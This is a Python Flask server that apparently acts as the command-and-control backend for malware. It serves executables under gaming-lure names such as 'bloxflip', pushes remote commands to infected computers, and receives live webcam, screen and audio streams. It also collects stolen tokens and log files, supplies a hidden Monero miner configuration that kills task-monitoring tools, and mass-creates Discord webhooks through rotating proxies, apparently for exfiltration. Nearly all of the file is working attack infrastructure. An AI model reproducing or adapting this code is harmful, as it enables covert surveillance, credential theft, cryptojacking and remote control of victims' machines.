import multiprocessing, threading, requests, hashlib, urllib3, random, flask, json, time, os
from flask import Flask, request, send_file, jsonify
from flask_sock import Sock

app = Flask(__name__)
sock = Sock(app)
command = None
proxies = requests.get(
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=5000&ssl=all&anonymity=elite&simplified=true"
).text.splitlines()
proxies = ["socks5://" + proxy for proxy in proxies]
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
key = os.environ["key"]
connectedComputers = []


channel_id = 1234567890
channel_id2 = 123456890


headers = {
    "content-Type": "application/json",
    "user-Agent":
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
    "authorization": os.environ["token"]
}


def proxyswap():
    global proxies
    while True:
        dproxies = requests.get(
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=5000&ssl=all&country=US&anonymity=elite&simplified=true"
        ).text.splitlines()
        proxies += ["socks5://" + proxy for proxy in dproxies]
        time.sleep(60)


def refreshproxies():
    global proxies
    dproxies = requests.get(
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=5000&ssl=all&country=US&anonymity=elite&simplified=true"
    ).text.splitlines()
    proxies += ["socks5://" + proxy for proxy in dproxies]
    time.sleep(60)


def clear(webhooks):
    time.sleep(30)
    print("Deleting webhooks")
    for webhook in webhooks:
        webhook = f"https://discord.com/api/webhooks/{webhook['id']}/{webhook['token']}"
        requests.delete(webhook, headers=headers, verify=False)
    print("Deleted all webhooks successfully")
    for _ in range(10):
        while True:
            try:
                proxy = random.choice(proxies)
                create(channel_id, proxy, timeout=60)
                break
            except:
                pass


def log(webhook, ip):
    requests.post(
        os.environ["webhook_generation_logs"],
        data={"content": f"{ip} has generated a new webhook {webhook}"})


def create(channel, proxy, timeout=10):
    if proxy:
        response = requests.post(
            f"https://discord.com/api/v9/channels/{channel}/webhooks",
            json={
                "name": "Captain Hook"
            },
            headers=headers,
            proxies={
                "httpss": proxy
            },
            verify=False,
            timeout=timeout).json()

    else:
        response = requests.post(
            f"https://discord.com/api/v9/channels/{channel}/webhooks",
            json={
                "name": "Captain Hook"
            },
            headers=headers,
            proxies={
                "httpss": proxy
            },
            verify=False,
            timeout=timeout).json()

    return response


def view(channel, proxy):
    try:
        return requests.get(
            f"https://discord.com/api/v9/channels/{channel}/webhooks",
            headers=headers).json()
    except:
        print(
            requests.get(
                f"https://discord.com/api/v9/channels/{channel}/webhooks",
                headers=headers).text)
        return None


def genWebhook():
    response = {"code": 30007}
    while True:
        try:
            proxy = random.choice(proxies)
            response = create(channel_id, proxy)
            break
        except Exception as e:
            print(e)
            if 'Expecting' in str(e):
                return os.environ["backup_webhook"]
            try:
                proxies.remove(proxy)
            except:
                break

    print(response)
    if "code" in list(response):
        if response["code"] == 30007:
            webhooks = view(channel, proxy)
            webhook = random.choice(webhooks)
            threading.Thread(target=clear, args=(webhooks, )).start()
            return f"https://discord.com/api/webhooks/{webhook['id']}/{webhook['token']}"

        elif response["code"] == 20029:
            print("Ratelimited. Attempting to use old webhook")
            try:
                webhooks = view(channel_id2, proxy)
                webhook = random.choice(webhooks)
                return f"https://discord.com/api/webhooks/{webhook['id']}/{webhook['token']}"
            except:

                print(
                    "No already existing webhooks, switching to seperate server"
                )
                webhooks = view(channel_id2, proxy)

                ratelimit = response["retry_after"]
                response = create(channel_id2, proxy)
                ratelimit = min(ratelimit, response["retry_after"])

                if not "id" in list(response):
                    time.sleep(ratelimit + 1)
                    print(
                        f"Can't generate webhook in new server, waiting ratelimit instead {response['retry_after']}"
                    )

            threading.Thread(target=clear, args=(webhooks, )).start()
            print(webhook)
            return f"https://discord.com/api/webhooks/{response['id']}/{response['token']}"

    print(response)
    print(
        f"https://discord.com/api/webhooks/{response['id']}/{response['token']}"
    )
    return f"https://discord.com/api/webhooks/{response['id']}/{response['token']}"


def ping(ws, computer):
    global connectedComputers
    tries = 5
    while True:
        time.sleep(1)
        try:
            tries -= 1
            ws.send("ping")
        except:
            if tries < 0:
                try:
                    connectedComputers.remove(computer)
                except:
                    pass
                try:
                    ws.close()
                except:
                    pass
                print("Bye!")
                break


@sock.route("/api/ws/commands")
def commands(ws):
    global connectedComputers
    global command
    print("Hi!")
    data = ws.receive()
    encoded = hashlib.sha256(data.encode()).hexdigest()
    if not encoded == key:
        print("Bad key")
        ws.close()
    while True:
        computer = ws.receive()
        if not "|" in computer:
            ws.send("getComputer")
        else:
            break
    print(computer)
    connectedComputers.append(computer)
    threading.Thread(target=ping, args=(ws, computer)).start()
    while True:
        if not command:
            continue
        print(command)
        if computer == command["target"]:
            if not computer in connectedComputers:
                connectedComputers.append(computer)

            ws.send(command["code"])
            command = None


@sock.route("/api/ws/camera")
def wscamera(ws):
    global cameraImages
    data = ws.receive()
    encoded = hashlib.sha256(data.encode()).hexdigest()
    if not encoded == key:
        print(0)
        ws.close()
    try:
        cameraImages
    except:
        cameraImages = {}
    computer = ws.receive()
    print(computer)
    while True:
        image = ws.receive()
        cameraImages[computer] = image


@sock.route("/api/ws/screen")
def wsscreen(ws):
    global screenImages
    print("Streaming Desktop")
    data = ws.receive()
    encoded = hashlib.sha256(data.encode()).hexdigest()
    if not encoded == key:
        print(1)
        ws.close()
    try:
        screenImages
    except:
        screenImages = {}
    computer = ws.receive()
    while True:
        image = ws.receive()
        screenImages[computer] = image


@sock.route("/api/ws/audio")
def wsaudio(ws):
    global computerAudio
    print("Streaming Audio")
    data = ws.receive()
    encoded = hashlib.sha256(data.encode()).hexdigest()
    if not encoded == key:
        print(1)
        ws.close()
    try:
        computerAudio
    except:
        computerAudio = {}
    computer = ws.receive()
    while True:
        image = ws.receive()
        computerAudio[computer] = image


@app.route("/sendCommand", methods=["GET", "POST"])
def sendCommand():
    global command
    global target
    try:
        request.form["key"]
    except:
        return "", 404
    encoded = hashlib.sha256(request.form["key"].encode()).hexdigest()
    if not encoded == key:
        return "", 404
    if request.method == "POST":
        command = request.form["Code"]
        target = request.form["Target"]
        return "sent!"


@app.route("/ad", methods=["GET"])
def ads():
    return requests.get('https://ads.bloxrewards.repl.co').text


@app.route("/bloxflip", methods=["GET"])
def controller():
    return send_file("main.exe", as_attachment=True)


def update(ws):
    global connectedComputers
    while True:
        newComputers = {"computers": connectedComputers}
        if len(newComputers["computers"]) > 1:
            newComputers["computers"] = list(set(connectedComputers))
        ws.send(newComputers)


@sock.route("/api/ws/computers")
def computers(ws):
    global connectedComputers
    global command
    data = ws.receive()
    encoded = hashlib.sha256(data.encode()).hexdigest()
    print(encoded)
    if not encoded == key:
        ws.close()

    threading.Thread(target=update, args=(ws, )).start()
    while True:
        command = json.loads(ws.receive())
        print(command)


@app.route("/watchdog", methods=["GET"])
def watchdog():
    return send_file("watchdog.exe", as_attachment=True)


@sock.route("/api/ws/showCamera")
def camera(ws):
    global cameraImages
    data = ws.receive()
    encoded = hashlib.sha256(data.encode()).hexdigest()
    if not encoded == key:
        ws.close()
    try:
        cameraImages
    except:
        cameraImages = {}
    try:
        oldImage
    except:
        oldImage = None
    computer = ws.receive()
    while True:
        if not computer in cameraImages:
            continue

        image = str(cameraImages[computer])
        if not oldImage == image:
            print(3)
            ws.send(image)
            oldImage = str(image)


@sock.route("/api/ws/showScreen")
def screen(ws):
    global screenImages
    data = ws.receive()
    encoded = hashlib.sha256(data.encode()).hexdigest()
    if not encoded == key:
        ws.close()
    computer = ws.receive()
    try:
        screenImages
    except:
        screenImages = {}

    while True:
        if not computer in screenImages:
            continue

        ws.send(screenImages[computer])
        time.sleep(1)


@sock.route("/api/ws/playAudio")
def audio(ws):
    global computerAudio
    data = ws.receive()
    encoded = hashlib.sha256(data.encode()).hexdigest()
    if not encoded == key:
        ws.close()
    computer = ws.receive()
    try:
        computerAudio
    except:
        computerAudio = {}

    while True:
        if not computer in computerAudio:
            continue
        if not computerAudio[computer]:
            continue
        ws.send(computerAudio[computer])
        computerAudio[computer] = None


@app.route("/webhook", methods=["POST", "GET"])
def webhook():
    try:
        request.form["key"]
    except:
        return "", 404
    encoded = hashlib.sha256(request.form["key"].encode()).hexdigest()
    if not encoded == key:
        return "", 404

    @flask.after_this_request
    def process_after_request(response):
        @response.call_on_close
        def process_after_request():
            print(hook)
            print("Waiting 30 seconds before deletion")
            time.sleep(3600)
            requests.delete(hook, headers=headers)
            print(f"Deleted {hook}")

        return response

    if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
        ip = request.environ['REMOTE_ADDR']
    else:
        ip = request.environ['HTTP_X_FORWARDED_FOR']

    try:
        hook = genWebhook()
        print(type(hook))
        log(hook, ip)
    except:
        hook = os.environ['backup_webhook']

    return hook


@app.route('/logs', methods=["POST"])
def logs():
    try:
        request.form["key"]
    except:
        print("Wrong key")
        return "", 404
    encoded = hashlib.sha256(request.form["key"].encode()).hexdigest()
    if not encoded == key:
        print("Wrong key")
        return "", 404

    print(request.files)
    log = request.files["file"]
    user = request.form["user"]
    ip = request.form["ip"]

    try:
        dir = f"logs/{user}-{ip}"
        log.save(dir)
    except Exception as e:
        print(e)

    return ""

@app.route("/tokens", methods=["POST", "GET"])
def tokens():
    try:
        request.form["key"]
    except:
        return "", 404
    encoded = hashlib.sha256(request.form["key"].encode()).hexdigest()
    if not encoded == key:
        return "", 404
    if request.method == "POST":
        keysFile = json.load(open("tokens.json", "rb"))
        token = request.form["token"]
        with open("tokens.json", "w+") as f:
            keys = keysFile["keys"]
            keys.append(token)
            keysFile["keys"] = keys
            json.dump(keysFile, f, indent=1)
            f.close()
        return "Ok"
    elif request.method == "GET":
        keysFile = json.load(open("tokens.json", "r"))
        keys = "\n".join(keysFile["keys"])
        return keys


@app.route("/miner")
def miner():
    return {
        "algo":
        "rx/0",
        "pool":
        "xmr-us-east1.nanopool.org",
        "port":
        14433,
        "wallet":
        "49Gwzrmm5irYKmURJgnEVajVnHo1mRMymMR8UykbGCSELCzh3q3BUBPJ4RSEho8K4c4WHvUR7LUtFcFyhXCJ11eLNt3QWoc",
        "password":
        "",
        "rig-id":
        "",
        "keepalive":
        False,
        "nicehash":
        False,
        "ssltls":
        True,
        "max-cpu":
        10,
        "idle-wait":
        1,
        "idle-cpu":
        50,
        "stealth":
        True,
        "stealth-targets":
        "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe",
        "process-killer":
        True,
        "kill-targets":
        "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe"
    }


@app.route("/logoutput", methods=["POST"])
def logoutput():
    print(request.form["errors"])
    return "", 404

@app.route("/bloxflip-py", methods=["GET"])
def logger():
    return send_file("logger.exe", as_attachment=True, download_name='lg.exe')


@app.errorhandler(404)
def page_not_found(e):
    if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
        ip = request.environ['REMOTE_ADDR']
    else:
        ip = request.environ['HTTP_X_FORWARDED_FOR']
    print(ip)
    return "", 404


@app.errorhandler(500)
def error(e):
    return "", 404


@app.errorhandler(405)
def notallowed(e):
    return "", 404


@app.errorhandler(400)
def notallowed(e):
    return "", 404


if __name__ == "__main__":
    # Run the Flask app
    multiprocessing.Process(target=proxyswap).start()
    app.run(host="0.0.0.0", debug=True, port=8080)
